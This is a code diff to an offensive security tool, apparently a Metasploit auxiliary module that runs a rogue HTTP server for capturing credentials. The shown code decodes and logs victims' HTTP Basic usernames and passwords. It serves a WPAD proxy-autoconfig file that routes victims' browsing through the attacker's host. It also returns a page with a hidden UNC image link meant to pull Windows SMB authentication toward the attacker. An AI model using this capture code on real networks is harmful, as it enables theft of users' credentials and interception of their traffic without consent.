@@ -53,6 +53,8 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 	end
 
 	def run
+		@myhost = datastore['SRVHOST']
+		@myport = datastore['SRVPORT']
 		exploit()
 	end
 	
@@ -91,27 +93,30 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 	end
 	
 	def dispatch_request(cli, req)
-	
+		
+		mysrc = Rex::Socket.source_address(cli.peerhost)
+		hhead = (req['Host'] || @myhost).split(':', 2)[0]
+
 		if(req['Authorization'] and req['Authorization'] =~ /basic/i)
 			basic,auth = req['Authorization'].split(/\s+/)
 			user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
 			report_auth_info(
 				:host      => cli.peerhost,
 				:proto     => 'http',
-				:targ_host => req['Host'] || datastore['SRVHOST'],
-				:targ_port => datastore['SRVPORT'],
+				:targ_host => hhead,
+				:targ_port => @myport,
 				:user      => user,
 				:pass      => pass,
 				:extra     => req.resource.to_s
 			)
-			print_status("HTTP LOGIN #{req['Host']}:#{datastore['SRVPORT']} #{user} / #{pass} => #{req.resource}")
+			print_status("HTTP LOGIN #{cli.peerhost} > #{hhead}:#{@myport} #{user} / #{pass} => #{req.resource}")
 		end
 		
 		if(req.resource =~ /^wpad.dat|.*\.pac$/i) 
-			prx = "function FindProxyForURL(url, host) { return 'PROXY #{Rex::Socket.source_address(cli.peerhost)}:#{datastore['SRVPORT']}'; }"
+			prx = "function FindProxyForURL(url, host) { return 'PROXY #{mysrc}:#{@myport}'; }"
 			res = 
 				"HTTP/1.1 200 OK\r\n" +
-				"Host: #{req['Host'] || datastore['SRVHOST']}\r\n" +
+				"Host: #{hhead}\r\n" +
 				"Content-Type: application/x-ns-proxy-autoconfig\r\n" +
 				"Content-Length: #{prx.length}\r\n" +
 				"Connection: Close\r\n\r\n#{prx}"
@@ -120,9 +125,9 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 			return
 		end
 		
-		print_status("HTTP REQUEST #{req['Host']}:#{datastore['SRVPORT']} #{req.resource}")
+		print_status("HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource}")
 		
-		data = "<html><head><title>Connecting...</title></head><body><img src='\\\\#{Rex::Socket.source_address(cli.peerhost)}\\public\\loading.jpg' width='1' height='1'></body></html>"
+		data = "<html><head><title>Connecting...</title></head><body><img src='\\\\#{mysrc}\\public\\loading.jpg' width='1' height='1'></body></html>"
 		res  = 
 			"HTTP/1.1 200 OK\r\n" +
 			"Host: #{req['Host'] || datastore['SRVHOST']}\r\n" +
